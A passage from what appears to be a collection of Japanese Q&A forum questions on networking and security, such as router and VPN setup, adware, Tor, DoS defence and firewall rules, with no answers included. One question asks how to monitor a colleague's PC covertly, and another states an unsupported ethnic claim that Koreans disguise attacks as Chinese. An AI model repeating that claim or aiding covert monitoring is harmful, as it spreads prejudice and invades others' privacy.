（デフォルト値は、APXXXXXXXXXXXX　XXはBHR-4GRVのMACアドレス） 　　　　　ワークグループ名はデフォルトの「WORKGROUP」のまま。 　　　　　　（なお、LAN外部のPCのワークグループ名も「WORKGROUP」） 　　この状態でLAN外部PCから、ネットワークドライブの割り付けを以下のように 　　行うと、「アクセスできません」というエラーが返ってくる。 　　もちろんLAN内部のPCではこの設定でネットワークドライブの割り当てが 　　できています。 　　　　￥￥（ブロードステージョン名）￥disk1_pt1 　　　　　　　　文字化けのため￥は全角文字としています。 なお、disk1_pt1 は BHR-4GRV が自動的に付ける名前。（１番目のディスクの 　　パーティション１） 　　外部PCは、WindowsXP と Windows7 の両方で確認したが現象は変わらず。 　　いろいろと試行錯誤した結果、以下のような設定をすると　WinsowsXP と 　　Windows 7　の両方でネットワークドライブの割り当てができました。 　(5)LAN外部PCの Windows ファイヤーウオールを「無効」にし、かつ上記(c)で 　　 「IPアドレス割り当て方法」を「DHCPサーバー設定の範囲から取得」に変更する。 　　しかし、この場合は、LAN外部PCから、LAN内部のNASに対してもネットワーク 　　ドライブの割り当てができてしまうし、何よりもファイヤーウオールを「無効」 　　にする事が気持ち悪いと思っています。 　　そこで、LAN外部PCの Windows ファイヤーウオールは「有効」の状態で、各種 　　設定（例外設定等）で対処し、かつLAN外部PCからネットワークドライブが 　　割り当てられるのは BHR-4GRV に接続された USB HDD までとしたい、という 　　事を実現したいのですが、以上に述べた設定をどのように変更したら良いのか 　　に関し、ご教示をお願いいたします。
グーグルの巡回監視に引っ掛かり、次のアドレスではグーグルからは見えなくなりました。 検索文字は「NTT労組神奈川退職者の会」です。 アドレスは http://ntt-kanagawataisyokusyanokai.orgでした。 その為に新たにレンタルサーバーから次のアドレスを設定しました。 http://ntttaisyoku.pepper.jp/index.html この新たに設定したものが何処のHPからも文字検索では出てきません。又、グーグルの検索は新しいアドレスを使って見ますと前のアドレスが影響しているものがあり見れないとコメントが出ます。 　 原因、解決方法をご指導下さい。
家でスロットしたいと思ってます。 やり方を教えてください。 コンセントぶっさせば出来るんでしょうか？ 高校生なんですが簡単にできますか？ ちなみに機種はモンキーターンです。 回答よろしくおねがいします。
先日、フリーメール（Gmailなど）のセキュリティーについて質問させていただきましたが、 ノートンなどのウイルスセキュリティーソフトはGmailなどのフリーメールで送信した場合、 管理者または第三者の閲覧防止になりますか？ よろしくお願いいたします。
こんにちは いわゆるペネトレーションテストではなくて、未知のセキュリティホールを発見する仕事というのはあるのでしょうか また、職種は分析ということになるのでしょうか それとも、エンジニアでしょうか よろしくお願いします
本人証明や、本物の会社であることの証明をする方法について調べています。 現実の社会での詐欺事件もありますので、 証明の仕方や信頼性について根拠を知りたいと思っています。 http://www.so-net.ne.jp/security/news/view.cgi?t … によれば、偽のＳＳＬ証明書による中間者攻撃が行われたとのことですが、 本物と認識されてしまうような、偽のＳＳＬ証明書に対して ほんとに本物かどうかを、私たちが見分ける方法はありますか？
windowsXPの環境でpscpの下記コマンドを用いて windows環境からLinux環境へのファイルアップ作業を行っておりました。 pscp -2 -i \\（共有ファイルサーバ）\アップロードツール\secure\apache.ppk -pw （passwd） C:\BOOT.INI apache@IPアドレス このたび、PCをwindows7に変更することになりまして、同様のコマンドを打ってみたのですが 正常に動作しません。 　→下記証明書エラーが発生してしまいます。 The server's host key is not cached in the registry. You have no guarantee that the server is the computer you think it is. The server's rsa2 key fingerprint is: ssh-rsa 2048 4d::::::1d Connection abandoned. Lost connection サイトなどを調べてみているのですが、あまりよくわかりません。 Windows7端末のセキュリティの設定なのかと思っているのですが、どなたかご教示いただけないでしょうか。 どうぞ宜しくお願いいたします。
Gmailなどのフリーメールでは送信した際、第三者または管理者にその内容を読み取られ、周囲に情報を拡散されたりするようなトラブルが起きることはありますか？確率的には高いのでしょうか。 よろしくお願いします。
1.YAMAHAのルータを使用してサイト間VPNを行おうとしていますが、VPNトンネルが張れません。 2.ルータAのLAN１の端末からルータBのLAN1の端末宛、ルータBのLAN１の端末からルータAのLAN1の端末宛にPingを実施しましたが応答がありません。 3.RTX1000のWebUIにアクセスしてIPSECの項目を確認しましたが、両方ともダウン状態でした。 4.ルータAのLAN１の端末からPR-200NEを通ってインターネットへアクセスできること、ルータBのLAN１の端末からPR-200NEを通ってインターネットへアクセスできることを確認しております。 何が原因になっているかわからず、困っております。 ご教示を頂けますようお願いいたします。 【NTT PR-200NE ファームウェア:18.34】 静的ルーティング設定：宛先：192.168.168.0/24 インターフェイス：LAN　ゲートウェイ：192.168.1.60 静的ルーティング設定：宛先：192.167.167.0/24 インターフェイス：LAN　ゲートウェイ：192.168.1.50 【YAMAHA RTX1000 ファームウェア：8.01.29　VPNルータA】 ip route default gateway 192.168.1.1 ip lan1 address 192.167.167.167/24 ip lan2 address 192.168.1.50/24 tunnel select 1 ipsec tunnel 101 ipsec sa policy 101 1 esp aes-cbc sha-hmac ipsec ike keepalive use 1 on ipsec ike local address 1 192.167.167.167 ipsec ike pre-shared-key 1 text password ipsec ike remote address 1 192.168.1.60 tunnel enable 1 ipsec auto refresh on ip route 192.168.168.0/24 【YAMAHA RTX1000 ファームウェア：8.01.29　ルータB】 ip route default gateway 192.168.1.1 ip lan1 address 192.167.167.167/24 ip lan2 address 192.168.1.50/24 tunnel select 1 ipsec tunnel 101 ipsec sa policy 101 1 esp aes-cbc sha-hmac ipsec ike keepalive use 1 on ipsec ike local address 1 192.168.168.168 ipsec ike pre-shared-key 1 text password ipsec ike remote address 1 192.168.1.50 tunnel enable 1 ipsec auto refresh on ip route 192.167.167.0/24 gateway tunnel 1
初めまして。質問させてください。 最近、動画サイトyoutubeを開くと 『システム内でスパイウェアが検出されました、マルウェアの影響でコンピューターが通常より遅くなっています』 や 『お使いのパソコンの性能が低下しています、windowsのエラーをただちに修正してください』 という広告？のようなものが表示されるようになりました。 確かに表示が遅かったり、文字を打ってもなかなか表示されない、ということが起きるようになりました。 他のサイトを開くと 『システム内でスパイウェアが検出されました』 という広告が出てきてすごくうっとうしいです。 いま使っているセキュリテイソフト、『ウイルスセキュリティＺＥＲＯ』ではスパイウェアやウイルスは全く検知されず、どうすればいいのか困っています。 個人用で特になくなったら困るデータはないのですが、ブログを更新したり、動画を編集する際にすごくうっとうしいので何か対処法はあるのでしょうか？ マルウェア、やスパイウェアというものが調べてもピンとこなかったのでご教授お願いいたします。
アメリカによる日本大使館の盗聴の話題がありますが、 ”しっかり暗号化していますので、いくら盗聴されても大丈夫です。” と、政府が言えるためには、どんな暗号化方式を採用したら良いと思いますか？ たとえば、 １．ＡＥＳ、カメリア ２．同じ文章も暗号化する時間で結果が異なる形式の暗号化 ３． など、。。。 お時間がありましたら、よろしくお願いいたします。
今回、ノートパソコンを購入し、ウイルス対策ソフトを購入しようと思っています。 そこで、皆さんのご意見を伺いたく、質問させて頂きました。 【質問】 もともと、お試しとして、下記(1)、(2)のウイルス対策ソフトが入っており、そのお試し期間が、 もうすぐ切れます。そこで、下記(1)、(2)のどちらを購入しようか迷っています。 どちらがいいのか、メリット・デメリットが分からず、思案しています。 そこで、皆さんのご意見を参考にさせて頂きたいと思っており、 ご意見をお聞かせ願えないでしょうか。 (1)ウイルスバスター (2)ノートン 以上、宜しくお願いお願い致します。
お世話になっております。 VirtualBOXのブリッジ接続についてネットワークの知識が乏しいもので、 大変困っておりご教授をお願いできないかと思います。 ＊ネットワーク構成＊ 192.168.11.1（ルータ-) 　　 192.168.11.12 　　 192.168.11.9 [WZR-1750DHP]━無線━[PC1：win7]━┯━[PC2：winXP] 　　　　　　　　　　　　　　　　　　　　　　　　　┃ 　 192.168.11.13 　　　　　　　　　　　　　　　　　　　　　　　　　┗━[ゲストPC：winXP] PC1＝ホストPC PC2＝全く別の物理PC（ホストPCの無線を使いLANでブリッジ接続） ゲストPC＝VirtualBOXで構築した仮想PC（ホストPCと仮想アダブタでブリッジ接続） 上記ネットワーク構成にて、ゲストPC側だけインターネット接続ができず困っております。 また、参考になるかどうかはわかりませんが、 PC１とPC２よりゲストPCへのpingは通りますが、 ゲストPCから、PC1、PC2へのpingが通りません。 大変恐縮ではございますが、ご教授をよろしくお願い致します。 ※必要な情報が抜けていましたら補足致します。
ポート全開放して、DMZにパソコンの無いアドレスを設定 必要なポートのみルート変換でサーバーPCにルートを設定している状態ですが、 セキュリティ的にはまずいのでしょうか？ ルーターでポートを閉じている状態の方が安全でしょうか？ 詳しい方ご教授ください。
携帯電話の会話やメール、現在地、ネット履歴などを傍受されています。警察が組織的にやってるとしても多分令状無しです。なんとかかいくぐりたいのですがsimカードやキャリアを変えることで妨害できるでしょうか
例えば会社や学校などの専従のネットワーク管理者がいるようなネットワークからのインターネット接続をしたとします。 通常のアクセスであれば、そのネットワーク管理者は誰がいつどこのサイトにアクセスしたか分かると思います(ログに残るというような意味で)。 Torのブラウザを使って、アクセスした場合、接続元のネットワーク管理者はどのサイトにアクセスしたか知る事はできるのでしょうか? Torネットワークの最初の接続先は分かると思うのですが、それ以降(最終目的の接続先も含めて)は分からないのではないかと思うのですが? Torを使うと最終接続先から接続元を辿るのは困難ということが、例の事件で有名になりましたが、接続元から接続先を辿ることはできるのでしょうか?
最近話題の　PRISM　ですが、 ヤフーメールをアメリカに時々出したりするので少し気になります。 PRISM　対策として、少しは効き目があるのは どんな方法でしょうか？ よろしくお願いいたします。
一番目はyahoo.co.jpですか それとも　 google.co.jpですか
ＦＭＶＮＢ40Ｂのノートパソコンをオークションで買いました。パソコンに詳しくありません(T_T)　どうか助けてください！
目安として200人ぐらいが接続する回線として （帯域は１人ベストエフォートとして、1Mbps でればよい） フレッツビジネス契約の1Gbpsと上記の人数が接続できるような VPNルーターというのはありますでしょうか？ （目標最大のVPNセッション数が、200程度になります） または、それをソフトウェアルーターで満足できるように実装することも可能でしょうか？ よろしくお願いします。
昨日、自宅のネット環境をケーブルから無線LANに切り替えました。 しばらく時間がたって、パソコンを見るとダウンロードすらしていないLINEが立ち上がって、自分以外のアカウントでメッセージのやりとりが始まっています…。 だれかと思えば、近くにいた友人宛のラインメッセージがパソコンに届いていたんです！！ あまりにもビックリして、プログラムの一覧を見てもLINEは無く、一度電源を落とすと立ち上がらなくなっていました。。 パソコン？無線LAN？友人の携帯？何が悪くてこうゆう状態になったかわかりません。 恐いので出来るだけ早く教えてほしいです。。 本当に宜しくお願いします。
CCNAの過去問題（日本語）て どこで手に入るんでしょうか？
ネットワークの勉強をはじめたのですが、初歩的な部分でちょっと疑問が。 ルータのポートはEthernet 0（e0）とかFastEthernet 0（Fa0）などと表示されているのですが、スイッチではfa0/1や本によってはs0/0/1などと書いてあるものまであります。 一番右にある番号はポート番号だと思うのですが、右から2番目や一番左にある番号はなんでしょうか？ 教えてください。 お願いいたします。
ヤフーメールやfacebookでログインするときに、 パスワードを保存しますか？ と聞いてきますが、これは保存したほうが安全なのでしょうか？ それとも、毎回入力するほうが安全なのでしょうか？ PC乗っ取りの件もあったので、気になります。 よろしくお願いいたします。
.htaccessにて、 <Files ~ "\.db$"> deny from all </Files> みたいにして、ブラウザからアクセスを不可にしたいのですが、 いくつかマッチ表現の仕方がわかりません。 まず、tmpから始まるファイル(tmp0101.datとかtmpabc.txtとか）を 全てアクセス不可にする場合と、 特定のディレクトリ配下を全てアクセス不可にする場合がわかりません。
最近デスクトップ画面に好ましくない広告が勝手に表示しています。Mzoneという小さい画像ですが、閉じてもまたいつか出てきます。アドウエアと思いますが、削除することができません。削除する方法を教えて頂けないでしょうか？
下記は何が違うのでしょうか？ ・受け入れ先サーバへ、DNSのAレコードを向ける ・受け入れ先サーバへ、URL転送する
　最近デスクトップ画面に好ましくない広告が勝手に表示しています。Mzoneという小さい画像ですが、閉じてもまたいつか出てきます。アドウエアと思いますが、削除することができません。削除する方法を教えて頂けないでしょうか？
以下の要件を満たすために設定を見直したり、試行錯誤していますが、原因がわからずうまくいっていない状況です。 お手数をおかけしますがご教示くださいますようお願いいたします。 【要件】 端末Aから端末Bに対してPingによる疎通確認を行いたい。 【状況】 端末Bからインターネット接続可でサイト閲覧が行える。 端末BからPR-200NE及び端末Aに対してPingによる疎通は問題なし。 端末AからRTX1000のLAN2に対してPing疎通は問題なし。 端末AからRTX1000のLAN1に対してPing疎通不可。 端末Aから端末Bに対してPing疎通不可。 ----------------------------------------------------------------------------------- 【構成】 The Internet <--> PR-200NE <--> (X1) TZ100(X0) <--> (LAN2) RTX1000 (LAN1) <--> 端末B ※　端末AはTZ100のX1とPR-200NEの間のセグメントにいます。 【環境】 1.NTT PR-200NE(192.168.1.1/24) ファームウェア：18.34 【静的ルーティング】 宛先:192.168.2.0/24 ゲートウェイ：192.168.1.50 宛先:172.16.200.0/24 ゲートウェイ：192.168.1.50 ※　端末Bのセグメントは192.168.0.0/16ですが、ロンゲストマッチによりゲートウェイに対して送信されないので192.168.2.0/24にしています。 2.SonicWALL TZ100(X0(LAN):172.16.200.40/24,X1(WAN):192.168.1.50/24)　ファームウェア：SonicOS Enhanced 5.8.1.12-65o.01.jpn 【静的ルーティング】 送信元：すべて　送信先:192.168.2.0/24 サービス：すべて　ゲートウェイ：172.16.200.30 インターフェイス：X0　メトリック:20 ※　端末Bのセグメントは192.168.0.0/16ですが、ロンゲストマッチによりゲートウェイに対して送信されないので192.168.2.0/24にしています。 3.YAMAHA RTX100(LAN1:192.168.2.20/16,LAN2:172.16.200.30/24) ファームウェア：Rev.8.01.29 【コンフィグ】 ip route default gateway 172.16.200.40 ip route 192.168.1.0/24 gateway 172.16.200.40 ip lan1 address 192.168.2.20/16 ip lan1 proxyarp on ip lan2 address 172.16.200.30/24 ip lan2 nat descriptor 1 nat descriptor type 1 masquerade nat descriptor address outer 1 172.16.200.30 nat descriptor address inner 1 auto 4.端末A(Windows7 Home Edition(x64) 192.168.1.3/24 ゲートウェイ:192.168.1.1) Windowsファイアウォール、ウイルス対策ソフト無効 5.端末B(Windows7 Professional(x64) 192.168.2.10/16 ゲートウェイ:192.168.2.20) Windowsファイアウォール、ウイルス対策ソフト無効 -------------------------------------------------------------------
現在、HP作成業者で、サーバー管理を担当しており、新しく専用サーバーを構築依頼しておりますが、DOS攻撃対策をどの様にすればいいのか迷っております。 以前、大規模なDOS攻撃の餌食になったので、完全な状態にして、稼働させたいのですが、 サーバー会社のポリシー上、DOS攻撃が発生しても、こちらで対応してください。といったスタンスの様でして、出来れば、.htaccess やconf ファイルには、あまりIPの追加をしたくないんですね。 （以前、ボリュームが増えすぎて、負荷が掛かり、正常に起動しないなどがあった為。） iptabales に打ち込むにしても、IPの数が多すぎて、とても追いつかないです・・・・ ファイアーウォールでも、逐一、IPを追加するしかない様ですが、 出来れば、サーバーの手前のファイアーウォール側で設定したいのですが、 やはり、IPアドレスが、逐一、更新されていく為、後手の対応の様です。 ●質問1● 例えば、複数の顧客様が見える為、http://akionweb.com/myobjects/adl/apache/CN.txt やhttp://www.cgis.biz/tools/access/　などを、 一括で、どこかにアップロードするなどの方法があれば良いのですが、 そういった方法はございますか？ あとは、http://faq.sakuratan.com/wiki/wiki.cgi?.htaccess を、confファイルのディレクトリに追記する位でしょうか？ 仮に、この場合、Apacheの以下の<Directroy>へ追記するのでしょうか？ DocumentRoot "/var/www/html" # # Each directory to which Apache has access can be configured with respect # to which services and features are allowed and/or disabled in that # directory (and its subdirectories). # # First, we configure the "default" to be a very restrictive set of # features. # <Directory /> Options FollowSymLinks AllowOverride None　　　←●ココ？ </Directory> ●2● もし、DOSになった場合、即座に該当のIPアドレスを取得したいのですが、 ログの仕様上、24時間程度しないと取得不可の様ですが、 何か、良い方法などがございましたら、ご教示頂けますでしょうか。
日本へのサイバー攻撃の60%以上が中国からとされるが、残りのうちに多いのは、何処からですか？ 韓国-北朝鮮からも多そうですが。 日本の企業情報（特に技術に関わる情報）を盗みたい韓国企業は山ほど存しますね。 ワザと中国に見せかける朝鮮人も多い筈。
sshでのサイト管理を検討しておりますが 経験談をお聞きしたく投稿させていただきます。 当方wordpressにてサイト構築をしており、先日サイト改ざんの 被害もあったこと、サーバ環境の関連でssh接続を検討しております。 今まではftp接続でファイルのやり取りをしておりましたためGUIで 作業をすることができましたが、sshは基本的にCUIでの操作となると思います。 当方コマンドプロントなど使用経験がある。という程度のものですが sshはセキュリティ的にもよさそうですし、自分の知識として CUIの世界ものぞいてみたいという気持ちもあります。 そこでｓｓｈはどのような利点があるのか伺いたいです。 私はサイトのファイル管理に使おうと考えておりますが その他便利な使い方、利点などはあるのでしょうか。 当方macbookにてブートキャンプ（ｘｐ、ノートンインターネットセキュリティ）の環境ですが やはりリナックスの環境を構築したほうがより利点があるのでしょうか。
皆様よろしくお願いします。 ハッキングとリモートコントロールですが、それぞれ単語の意味は検索してイメージをつかめたのですが、 リモートコントロールはハッキングの一部という理解であっておりますでしょうか？ 分かりやすく説明いただけると助かります。 よろしくお願いします。
outlookを立ち上げるとパスワードを求められるようになりました。 パスワードを入れて保存。で解決はしましたが、なぜ急に聞かれるようになったのか気になっています。 そこで、何か変わったことをしたかな?と考えたところ 「ユーザーアカウントパスワードを変更」したあとから、求められるようになった気がしています。 ユーザーアカウントのパスワードを変更するとメールのパスワードまで聞かれるようになる物なのでしょうか？何かこの2つは関連があるのですか？ お分かりになる方教えてください。
hacked!!って描かれた壁紙を探そうとGoogle画像検索中、 Aviraからこのような検出画面が出ました。 (アドレスのhttp://www.は抜いてあります) ウイルスまたは不要なプログラムが 、要求されたページの HTTP データで検出されました。 要求された URL: ztuts.com/2012/06/how-to-shutdown-computer-forever-fun.html 情報: BAT/KillWin.WU バッチ ウイルスの認識パターンが含まれています 検索をかけましたがBAT/KillWin.WU についての情報があまりないので、 このBAT/KillWin.WU についての情報を知っている方どうかご教授ください。
Ｇｍａｉｌにログインする時、ユーザー名の第一字目を入れると同時に、その枠の右端に「Ｘ」マークが出て、又、パスワード枠に第一字目を入れると同時に、その枠の右端に「黒点の上に半円の傘状」マークが出ます。これは何かを教えて下さい。特に「黒点の上に半円の傘状マーク」は「目玉」がパスワードを盗み見しているみたいで不安です。なお、「Ｘ」印は、このOKWAVEの質問の表題を入れる時も出ました。
私はネット取引のパスワードとかをワードに書いてパソコンの ディスクトップに保存しています。 これは危険な行為なのでしょうか？
Gmailにログイン出来ません。PCからは出来ますが、ノートパソコンからは、ログイン押すとlivedoorページが出てきてGmailに行けません。どうしてでしょう？
今いる会社で、あるベンダのパッケージソフトを導入し、ネットワークを構築しています。 そのネットワークは、外部接続せず、通常の社内のLANにも接続せず、そのパッケージソフトだけの クローズドネットワークにしてあります。そのシステムが本稼働し、保守契約を結んだのですが、ベンダからはリモート接続してサポートをしたいという提案がありました。その際、光回線などを利用せず、ダイヤルアップ接続でpcanywhereというソフトウエアをインストールしてリモートでサポートをするというのです。最大のメリットはセキュリティ対策ということでした。モデムは５６Kのものを利用するのですが、 そのベンダが弊社のネットワークにダイヤルアップで接続してリモート接続した場合、おそくないのでしょうか？うちの社員からは５６Kの速度でサポート出来るわけないと言っています。しかし、そのベンダは過去のお客さんもすべてダイヤルアップで接続してサポートしており、接続されpcanywhereで入れば速度は関係ないと言っているのですが、それは正しいでしょうか？また、セキュリティを考慮する場合、ダイヤルアップは一般的でしょうか？ご教示頂けるようお願い致します。
ルーターが故障したため、新しいルーターに交換しました、するとIPアドレスの問題からか、一部の機器につながらなくなり困っています、WIN7ですがネットワークと共有センターからフルマップの表示を行いますと、ネットワークで互換性の無いルーターがあったので、マップを作成できません、となります、トラブルシューテイングを行いましたが、解決できません、助けてください。
PCを高速化します　というメッセージが頻繁にでます。これを消すには どうすればいいですか？　
Cisco 892Jというルーターの購入を検討しています。 http://www.cisco.com/web/JP/product/hs/routers/c … このスペックを見ると、WAN側がGigabitで、LAN側が100BASEとなっています。 逆なら理解できるのですが、WANがLANより速い理由を教えていただけないでしょうか？ 何らかの理由があると思うのですが、当方素人でよく分かりません。 詳しい方、教えていただければと思います。 宜しくお願い致します。
困っています。 YAMAHAのRTX1500というルータを本社に置き、各支店はNVR500というようなルータを使ってPPTPでネットワークを組んでいます。 そこにリモートアクセスPPTPで時々リモート端末からも接続するという使用法をしていました。 ところが最近OSをXPからWIN7にしたところ、リモートで接続できなくなりました。 理由はWINDOWSはVISTからmschap-v2だけをサポートしmschapでは接続できないからだそうですね。 そこで本社ルータのPPTP認証方式をmschap-v2に変更したところ、各支店と接続が出来なくなりました。 接続するためには各支店のルータの設定を一斉に変更しなくてはなりません。 これが全国数十ヶ所あるため困っています。 リモート端末からのモバイルでの接続をあきらめるか？ 全拠点のルータを一斉に変更するかどちらかしか選択肢はありませんか？ 何か良い方法アドバイスがありましたらお願いします。
こんにちは 身元を隠すためにプロキシサーバを使いたいのですが、サーバを構築する余裕がありません そこで、パソコン上でプロキシサーバを設定しようとしたのですが、パソコンにプロキシを入れても身元は隠せないと聞きました これは本当でしょうか よろしくお願いします
よろしくお願いします。 引き継いだシステムの ラック後ろの配線やLANケーブリングがスパゲティのように なっており、機器の増設や故障時の対応にリスクを感じています。 こういった状況の回避方法の１つとして、 「無線LAN」の導入を検討するのは正しいアプローチ（要件）でしょうか？。 ※ケーブル自体の物量を減らしたい
フィリピンでWifiを使用していますが、電波が弱いため、PLANEX　GW-900D、GW-450D を使用して、電波を強くしたいのですが、使用可能でしょうか？ 特にビデオチャットを快適にしたいです。 宜しくお願い致します。 環境；レノボ　ThinkPad Edge E420 　ノートパソコン　Win 7　home
「HACKING: 美しき策謀 脆弱攻撃の理論と実際」を読む前に読んどいた方が良い本はありますか？ 読んどいた方が良い本のタイトルを教えてください。 よろしくお願いします。
よろしくお願いします。 今月から配属になった客先のシステムですが、 構成管理で悩まされています。 システムは正常に稼動していますが、 例えばCisco Catalystスイッチでは、ログインするIDやパスワードも不明、 またそもそも管理IPも不明・・ で何も手が出せず、動いているのを見ているしか無い状況です。 よりによって24ポートは全て使用されておりますが、タグが不完全で どのサーバとの結線かも可視化ができていません。 仮に故障した場合、同じ構成に戻せるかは、リスクが高いように感じます。 上記で、「NWスイッチに割り振られた管理IPが不明で、それを明確にしたい場合」、 どういった対応策がありますでしょうか？。 ICMPポーリングにより自動で監視マップを作成してくれる、 フリーのSNMPマネージャなどを探してみましたが、見つけられず・・。 アドバイスを頂けると助かります。
お世話になります。 サーバーの共有フォルダにアクセスしたいのですが、以下のようなエラーが発生してしまい、うまくいきません。 「ファイルとプリンターの共有リソースはオンラインですが、接続試行に応答していません。」 「リモートコンピュータはポート445での接続に応答していません。」 ネットでいろいろ調べてポートを設定したりやっているのですが、うまくいきません。 環境は以下の通りです。 クライアント環境 OS：Windows7 Professional　SP1 IPアドレス：10.4.xｘｘ.xxx サブネットマスク：255.255.255.0 デフォルトゲートウェイ：10.4.ｘｘｘ.254 サーバー環境 OS：Windows Server 2008　Standard　SP1 IPアドレス：10.6.xｘｘ.xxx サブネットマスク：255.255.252.0 デフォルトゲートウェイ：10.6.ｘｘｘ.254 共有フォルダはeveryone　フルコントロールにしてあります。 知見のある方がいらっしゃいましたらよろしくお願いします。
リモートアシスタンスで以下のことができるでしょうか？ TCP/IPの社内LAN（有線）内で Aさんが使用するPCからBさんが使用するPCをモニタリング・・・・ 「AさんがBさんのPCの操作状況（起動ソフトや入力中の文字まで）をリアルタイムにAさんのPCで見ることができる」 OSは、windows7以前のOS,すべてのエディションが対象 AさんはBさんの同僚とします。 （１） このようなことが、できるでしょうか？できるかどうかがまず一点目 (2) できるとしたら、Bさんに気付かれずにモニタリングすることはできるか？ 気付かれずに・・・とは、BさんPCになんらかの了解を得るメッセージを表示させることなく・・という ことを指しています。Bさんは、ネットワーク設定、レジストリ、サービス、アプリのインストールなど一切を行わず、すでにあるPCを利用するのみの状態という前提です。またAさんは、社内LAN管理者 に対し指示する権限を持つという前提。 (3) 1ができるとしたら、リモートアシスタンスはAさんPCにインストールするのみでよいか？ 他になにか条件が必要か？他に条件が必要な場合何が必要か？ http://support.microsoft.com/kb/301527　は参照 （だがwindows7以前のことが知りたい、またリモートアシスタンス以外の条件はなにが必要かまで 細かくは記述されていない） (4) 1,2,3とは異質な質問ですが、Aさんの行為は倫理的にOKか？ (5) 4とはまた少し違いますが、社内のことではあるが法的な見地で問題ないか？ 以上よろしくお願いいたします。
ルーターを使用していれば、WAN側からのアクセスはブロックされるので安全だと思い込んでいました。 しかし UPnP http://oshiete.goo.ne.jp/qa/8104974.html Teredo http://www.computerworld.jp/topics/563/206620?pa … のようにルーター配下のパソコンでプロトコルやサービスを有効にすると、影響はそのパソコン内部にとどまらず、ルータにまで影響を与えて、ルータのポートを開いてWAN側からのアクセスを通してしまうことがあることを知りました。 ネット上に接続・探索していくサービスやプロトコルの中に、LAN内からWANへアクセスできるようにするだけではなくて、ルーターのWAN側ポートを勝手に開いてルーター配下のパソコンにネット上からアクセスできるようにするものがいくつか含まれているのではないかと心配です。 個人的に可能性として思いつくのは、 iSCSI,WMI,PNRP,WS-D,SSDP,LLMNR,ICMPv6,SMB,GRE,Link-Layer Topology,NAP,pnp-x ip bus enumerator,SNMP,Network Connections,Network List Service,Network Location Awareness,Network Store Interface Service,Performance Logs & Alerts,Remote Access Auto Connection Manager,Remote Access Connection Manager,WebClient,Workstation などです。 ルーター配下のパソコン上で有効にすると、ルーターのWAN側ポートを勝手に開けて侵入を許してしまうプロトコルやサービスについて、皆様、思いつくままに片っ端から教えていただけないでしょうか？ どうかよろしくお願い致します m(＿ ＿)m
UPnP対応のルーター配下のパソコンAでUPnP対応のアプリケーションを起動しているとします。 インターネット上のパソコンBから同じUPnP対応のアプリケーションを使って、ルーター配下のパソコンAのUPnP対応アプリケーションにアクセスできます。 どのような仕組み・過程を経てルーターを越えられるのでしょうか？ ルーターは基本的に外部からのアクセスはブロックできると思うので、セキュリティの観点から気になります。
プロバイダから記憶に無い、「30GB/日以上のアップロード」による規制を受けて困っています。 プロバイダはOCN フレッツ光ファミリータイプで契約をしています。 お世話になります。 OCNから契約解除や回線の停止警告のメールを受けましたが、何故30GB制限の対象になったのか原因に心当たりが全くありません。 【環境】 OS: Windows7 ルーター: BUFFALO WZR-D1100H （無線でPSVita、有線でPC利用） 無線のセキュリティキーは WPA/WPA2 で暗号化 Portは必要Portを開けています。（PS Vitaやゲーム等で利用するPort） 回線は自分以外利用者無し（家族が使ってる可能性無し） セキュリティソフト利用無し P2P、torrent等の利用無し（その他類似アップロード、ダウンロードサービス等利用無し） 【現状】 ひと月前に警告を受け無線のセキュリティキーの変更、ウィルスチェック（シマンテックオンラインスキャン）、 OSの再インストール、ルーターのファームウェア更新等をして考えうる限りの対策をしましたが、 つい最近大量のアップロードがあったとの事でOCNより回線の一時停止措置を受けることになってしまいました。 自分で思いつくのはウィルス等による物か、無線ジャック等の可能性しか考えられないのですが…いまいちルーターへの 不正アクセスのログを調べる方法やその他に記憶にない回線の大量利用の原因等が思い当たりません。 OCNのサポセンには相談済みですが、ウィルス対策ソフトやルーター設定の見直し等同じような対処法しか聞くことができませんでした…。 この様な状況でどのような対策や、検証をしていけばいいのか詳しい方がいらっしゃいましたらよろしくお願いします。
こんにちは、度々ありがとうございます IP アドレスからプロバイダを特定するにはどんな方法があるでしょうか ドメインを取得しているので、ドメインサーチや逆引きではドメイン情報しかわかりません 非常に困っています よろしくお願いします
windows7で搭載されているファイアウォールのプロファイルについて教えてください。 [セキュリティが強化されたwindowsファイルウォール]でプライベートプロファイルがアクティブになっています。 またファイアウォールの状態で ○規則に一致しない受信接続はブロックされます ○規則に一致しない送信接続は許可されます となっています。 ドメインには参加していません。 この状況下で A [受信の規則]で プロファイルがプライベートである規則が有効になっていれば、その規則での受信は許可され、 プロファイルがプライベートである規則であっても、無効(有効の項目が いいえ になっている)であれば、その規則での受信はブロックされると思います。 それでは A-1 プロファイルがプライベート以外(ドメインやパブリック)の規則があり、その規則が有効になっている場合、その規則での受信は許可されるのかどうか？ A-2 プロファイルがプライベート以外(ドメインやパブリック)の規則で、その規則が無効になっている場合、その規則での受信は許可されるのかどうか？ A-3 [受信の規則]の項目で作成されていない未知の規則で受信をした場合、その受信は許可されるのかどうか？ B [送信の規則]で プロファイルがプライベートである規則が有効になっていれば、その規則での送信は許可されると思います。 それでは B-1 プロファイルがプライベートである規則であっても、無効(有効の項目が いいえ になっている)であれば、その規則での送信は許可されるのかどうか？ B-2 プロファイルがプライベート以外(ドメインやパブリック)の規則があり、その規則が有効になっている場合、その規則での送信は許可されるのかどうか？ B-3 プロファイルがプライベート以外(ドメインやパブリック)の規則があり、その規則が無効になっている場合、その規則での送信は許可されるのかどうか？ B-4 [送信の規則]の項目で作成されていない未知の規則で送信をした場合、その送信は許可されるのかどうか？ 以上のケースについてそれぞれ教えてください。 (ややこしくなりそうなので、A-1,A-2,B-1,B-2,B-3の規則は後から独自につくられたものではなく、基本的にwindows7をインストールした時に始めから存在する規則として考えてください。)
こんにちは IP アドレスは 0.0.0.0 ～ 255.255.255.255 までありますが、日本国内で使われている IPアドレスの範囲は決まっているのでしょうか よろしくお願いします
TCPのパケット再送について、 いろいろ調べて 「待ち時間RTOが過ぎたら再送、ということをn回くりかえし、それでもダメならコネクションが切断される。 RTOは初期値は3だが、同一コネクション上での再送が繰り返されるとその度に倍の値になる（上限56秒）。 nのデフォルト値は5」 ってことかな？と理解しました。 Q1　正しいでしょうか？ Q2　Windowsで上記各パラメタを調整する方法を教えて下さい。 Q3　SRTTというものも目にしましたが上記とどう関係するのかわかりません。 ご教示のほど宜しくお願いします。
最近、パソコンの調子が、悪くて「Dll-Files」と言うソフトで、スキャンしたら、大量のエラーが出て、パソコンの危険度「高」になってます。 修復する為には、有料で、ソフトを購入しなければなりません。 無料で修復できるソフトとかはあるでしょうか???
